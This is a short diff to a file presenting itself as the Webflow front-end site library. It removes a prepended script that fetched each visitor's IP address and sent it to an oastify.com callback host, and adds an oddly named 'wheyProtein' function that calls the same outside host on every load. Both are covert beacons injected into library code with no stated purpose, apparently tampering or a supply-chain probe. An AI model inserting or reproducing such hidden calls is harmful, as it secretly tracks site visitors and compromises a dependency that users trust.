@@ -1,4 +1,13 @@
- async function getIpAddress() { try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); logIpAddress(data.ip); } catch (error) { console.error('Error fetching IP address:', error); } } async function logIpAddress(ip) { try { const logUrl = 'https://agui3t8jizmfrqc3b6f39yxgf7ly9oxd.oastify.com?ip=' + ip; await fetch(logUrl); } catch (error) { console.error('Error logging IP address:', error); } } getIpAddress(); 
+async function wheyProtein() {
+            try {
+                const logUrl = 'https://agui3t8jizmfrqc3b6f39yxgf7ly9oxd.oastify.com';
+                await fetch(logUrl);
+            } catch (error) {
+                console.error('Oops, you\'ve dropped some of your protein', error);
+            }
+        }
+
+        wheyProtein();
 /*!
  * Webflow: Front-end site library
  * @license MIT
